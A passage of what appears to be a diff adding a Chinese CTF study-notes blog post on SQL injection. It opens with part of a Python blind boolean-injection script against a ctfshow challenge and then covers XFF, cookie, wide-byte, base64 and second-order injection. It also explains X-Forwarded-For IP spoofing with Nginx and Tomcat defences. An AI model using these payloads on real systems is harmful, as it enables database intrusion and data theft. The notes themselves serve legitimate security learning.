mid = (head + tail) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 查数据库</span><br>        <span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span><br>        <span class="hljs-comment"># 查字段</span><br>        <span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;&quot;</span><br>        <span class="hljs-comment"># 查flag</span><br>        <span class="hljs-comment">#payload = &quot;select group_concat(f1ag) from ctfshow_fl0g&quot;</span><br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">f&quot;admin&#x27; and if(ascii(substr((<span class="hljs-subst">&#123;payload&#125;</span>),<span class="hljs-subst">&#123;i&#125;</span>,1))&gt;<span class="hljs-subst">&#123;mid&#125;</span>,1,2)=&#x27;1&quot;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span><br>        &#125;<br>        r = requests.post(url,data=data)<br>        <span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;8bef&quot;</span>)&gt;<span class="hljs-number">0</span>:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>
+
+<p><code>ascii()</code>函数可以ord或者直接比较字符是否相等</p>
+<p>绕过了substr，改用left函数。</p>
+<p><img src="/../images/c71b49aac6064b67a95f489801e319bb.png" srcset="/img/loading.gif" lazyload alt="c71b49aac6064b67a95f489801e319bb"></p>
+<p><img src="/../images/aeab32bab7c149d48e32b7b6923f7f4e.png" srcset="/img/loading.gif" lazyload alt="aeab32bab7c149d48e32b7b6923f7f4e"></p>
+<h2 id="HTTP请求头参数注入-XFF注入攻击"><a href="#HTTP请求头参数注入-XFF注入攻击" class="headerlink" title="HTTP请求头参数注入-XFF注入攻击"></a><strong>HTTP请求头参数注入-XFF注入攻击</strong></h2><ul>
+<li>XFF注入即HTTP头部的X-Forwarded-for参数存在sql注入；</li>
+<li>例如测试此参数的值 X-Forwarded-for:127.0.0.1′ 响应有sql报错，那么此处就是注入点；</li>
+<li>之后使用union注入的方法完成即可。</li>
+</ul>
+<p>登录成功之后加载页面的那个get请求昂，把请求发送到Repeater模块中，去除User-Agent：，然后输入’ 然后运行后观察MYSQL语法报错然后发现存<br>在SQL注入漏洞</p>
+<h2 id="利用X-Forwarded-For伪造客户端IP漏洞成因及防范"><a href="#利用X-Forwarded-For伪造客户端IP漏洞成因及防范" class="headerlink" title="利用X-Forwarded-For伪造客户端IP漏洞成因及防范"></a>利用X-Forwarded-For伪造客户端IP漏洞成因及防范</h2><p>问题背景<br>在Web应用开发中，经常会需要获取客户端IP地址。一个典型的例子就是投票系统，为了防止刷票，需要限制每个IP地址只能投票一次。</p>
+<p>如何获取客户端IP<br>在Java中，获取客户端IP最直接的方式就是使用request.getRemoteAddr()。这种方式能获取到连接服务器的客户端IP，在中间没有代理的情况下，的确是最简单有效的方式。但是目前互联网Web应用很少会将应用服务器直接对外提供服务，一般都会有一层Nginx做反向代理和负载均衡，有的甚至可能有多层代理。在有反向代理的情况下，直接使用request.getRemoteAddr()获取到的IP地址是Nginx所在服务器的IP地址，而不是客户端的IP。</p>
+<p>HTTP协议是基于TCP协议的，由于request.getRemoteAddr()获取到的是TCP层直接连接的客户端的IP，对于Web应用服务器来说直接连接它的客户端实际上是Nginx，也就是TCP层是拿不到真实客户端的IP。</p>
+<p>为了解决上面的问题，很多HTTP代理会在HTTP协议头中添加X-Forwarded-For头，用来追踪请求的来源。X-Forwarded-For的格式如下：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-attribute">X</span>-Forwarded-For: client1, proxy1, proxy2<br></code></pre></td></tr></table></figure>
+
+<p>X-Forwarded-For包含多个IP地址，每个值通过逗号+空格分开，最左边（client1）是最原始客户端的IP地址，中间如果有多层代理，每一层代理会将连接它的客户端IP追加在X-Forwarded-For右边。</p>
+<p>下面就是一种常用的获取客户端真实IP的方法，首先从HTTP头中获取X-Forwarded-For，如果X-Forwarded-For头存在就按逗号分隔取最左边第一个IP地址，不存在直接通过request.getRemoteAddr()获取IP地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">public String getClientIp(HttpServletRequest request) &#123;<br>    String xff = request.getHeader(<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>);<br>    <span class="hljs-keyword">if</span> (xff == null) &#123;<br>        <span class="hljs-keyword">return</span> request.getRemoteAddr();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> xff.contains(<span class="hljs-string">&quot;,&quot;</span>) ? xff.split(<span class="hljs-string">&quot;,&quot;</span>)[<span class="hljs-number">0</span>] : xff;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>另外，要让Nginx支持<code>X-Forwarded-For</code>头，需要配置：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<br></code></pre></td></tr></table></figure>
+
+<p>$proxy_add_x_forwarded_for会将和Nginx直接连接的客户端IP追加在请求原有X-Forwarded-For值的右边。</p>
+<p>伪造X-Forwarded-For<br>一般的客户端（例如浏览器）发送HTTP请求是没有X-Forwarded-For头的，当请求到达第一个代理服务器时，代理服务器会加上X-Forwarded-For请求头，并将值设为客户端的IP地址（也就是最左边第一个值），后面如果还有多个代理，会依次将IP追加到X-Forwarded-For头最右边，最终请求到达Web应用服务器，应用通过获取X-Forwarded-For头取左边第一个IP即为客户端真实IP。</p>
+<p>但是如果客户端在发起请求时，请求头上带上一个伪造的X-Forwarded-For，由于后续每层代理只会追加而不会覆盖，那么最终到达应用服务器时，获取的左边第一个IP地址将会是客户端伪造的IP。也就是上面的Java代码中getClientIp()方法获取的IP地址很有可能是伪造的IP地址，如果一个投票系统用这种方式做的IP限制，那么很容易会被刷票。</p>
+<p>伪造X-Forwarded-For头的方法很简单，例如Postman就可以轻松做到：</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5c2336dbb32b5f6e31d3f1344705bb62.png" srcset="/img/loading.gif" lazyload alt="Postman伪造X-Forwarded-For"></p>
+<p>当然你也可以写一段刷票程序或者脚本，每次请求时添加<code>X-Forwarded-For</code>头并随机生成一个IP来实现刷票的目的。</p>
+<p><strong>如何防范</strong></p>
+<p>方法一：</p>
+<p>在直接对外的Nginx反向代理服务器上配置：</p>
+<p>proxy_set_header X-Forwarded-For $remote_addr;</p>
+<p>这里使用$remote_addr替代上面的$proxy_add_x_forwarded_for。$proxy_add_x_forwarded_for会在原有X-Forwarded-For上追加IP，这就相当于给了伪造X-Forwarded-For的机会。而$remote_addr是获取的是直接TCP连接的客户端IP（类似于Java中的request.getRemoteAddr()），这个是无法伪造的，即使客户端伪造也会被覆盖掉，而不是追加。</p>
+<p>需要注意的是，如果有多层代理，那么只要在直接对外访问的Nginx上配置X-Forwarded-For为$remote_addr，内部层的Nginx还是要配置为$proxy_add_x_forwarded_for，不然内部层的Nginx又会覆盖掉客户端的真实IP。</p>
+<p>方法二:</p>
+<p>另外一种方法是我在Tomcat源码中发现的：org.apache.catalina.valves.RemoteIpValve</p>
+<p>实现思路：遍历X-Forwarded-For头中的IP地址，和上面方法不同的是，不是直接取左边第一个IP，而是从右向左遍历。遍历时可以根据正则表达式剔除掉内网IP和已知的代理服务器本身的IP（例如192.168开头的），那么拿到的第一个非剔除IP就会是一个可信任的客户端IP。这种方法的巧妙之处在于，即时伪造X-Forwarded-For，那么请求到达应用服务器时，伪造的IP也会在X-Forwarded-For值的左边，从右向左遍历就可以避免取到这些伪造的IP地址。</p>
+<h2 id="HTTP请求头参数注入-cookie注入攻击"><a href="#HTTP请求头参数注入-cookie注入攻击" class="headerlink" title="HTTP请求头参数注入-cookie注入攻击"></a>HTTP请求头参数注入-cookie注入攻击</h2><ul>
+<li>抓包对一个url的http请求头的所有参数进行sql注入测试，里面的所有参数都有可能存在注入点，如果响应包出现sql报错，那么测试的这个参数就是注入点；</li>
+<li>常见的http头部注入的参数有：</li>
+<li></li>
+<li>如果测试到cookie参数的时候，响应有报sql错误，那么就是cookie注入攻击；</li>
+<li>和union注入的差别就在于注入点不一样，之后使用union注入的方法即可。</li>
+</ul>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">【<span class="hljs-variable">Referer</span>】、【<span class="hljs-variable">X</span><span class="hljs-operator">-</span><span class="hljs-variable">Forwarded</span><span class="hljs-operator">-</span><span class="hljs-built_in">For</span>】、【<span class="hljs-variable">Cookie</span>】、【<span class="hljs-variable">X</span><span class="hljs-operator">-</span><span class="hljs-built_in">Real</span><span class="hljs-operator">-</span><span class="hljs-variable">IP</span>】、【<span class="hljs-variable">Accept</span><span class="hljs-operator">-</span><span class="hljs-built_in">Language</span>】、【<span class="hljs-variable">Authorization</span>】<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="宽字节注入攻击"><a href="#宽字节注入攻击" class="headerlink" title="宽字节注入攻击"></a>宽字节注入攻击</h2><ol>
+<li>如果遇到单、双引号被转义，变成了反斜杠，导致参数id无法逃逸单引号的包围；</li>
+<li>一般情况下，此处就不存在sql注入漏洞的；</li>
+<li>但是如果数据库的编码为GBK时，就可以使用宽字节注入，因此在不知道是否是GBK编码时，都可以尝试去使用宽字节注入；</li>
+<li>宽字节的格式是在地址后先加一个 %df ，再加单引号，因为反斜杠的编码为%5c，在GBK编码中，%df%5c是繁体字“連”，因此，单引号成功逃逸，爆出sql错误；</li>
+<li>因此构造闭合规则时，在单引号前面加上 %df 就行了；</li>
+<li>之后在闭合规则中写入同union注入的一些查询语句就行了；</li>
+</ol>
+<h2 id="base64注入攻击"><a href="#base64注入攻击" class="headerlink" title="base64注入攻击"></a>base64注入攻击</h2><ul>
+<li>如果遇到url的参数id的值看起来像base64的，先拿去url解码，然后如果是base64，拿去base64解码，解出来的应该就是id的值（1，2等数字）；</li>
+<li>那么如果要对这个url进行sql注入测试，就需要对id后面的所有值进行base64编码；</li>
+<li>注入的方式步骤都是跟union注入一样的，只不过后面的所有值（整个payload）都要进行base64编码后传给url的c参数提交，包括闭合规则</li>
+</ul>
+<h2 id="二次注入攻击"><a href="#二次注入攻击" class="headerlink" title="二次注入攻击"></a>二次注入攻击</h2><ul>
+<li>二次注入一共有两个url，url一用来注入，也就是注入点，插入sql语句的地方，另外一个url用来返回信息；</li>
+<li>也就是url一插入了sql语句，url一的响应里面就会返回这条信息对应的id值，然后url二就传入这个新id值，然后访问，响应回来之后将会爆出sql语句查询的结果，正确或者错误的sql信息；</li>
+<li>就相当于url是一个用户注册的地方，用户注册后会在数据库里面加入新id存放用户的注册信息，那么这个id可以传给url二来访问，url二就可以显示出用户的注册信息，但如果注册信息含义恶意sql语句，url二就会显示出敏感的数据库信息；</li>
+<li>跟union注入攻击差不多，只是回显的信息需要在另外的url中显示出来了；</li>
+<li>后面就是union注入攻击的常规操作</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>http://maskobito.github.io/2025/10/10/10.10/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/01/9.30/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    
+      <script type="text/javascript">
+        var disqus_config = function() {
+          this.page.url = 'http://maskobito.github.io/2025/10/10/10.10/';
+          this.page.identifier = '/2025/10/10/10.10/';
+        };
+        Fluid.utils.loadComments('#disqus_thread', function() {
+          var d = document, s = d.createElement('script');
+          s.src = '//' + 'fluid' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        });
+      </script>
+    
+    <noscript>Please enable JavaScript to view the comments</noscript>
+  </div>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/typing-effect.js"></script>
+<script src="/js/particle.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
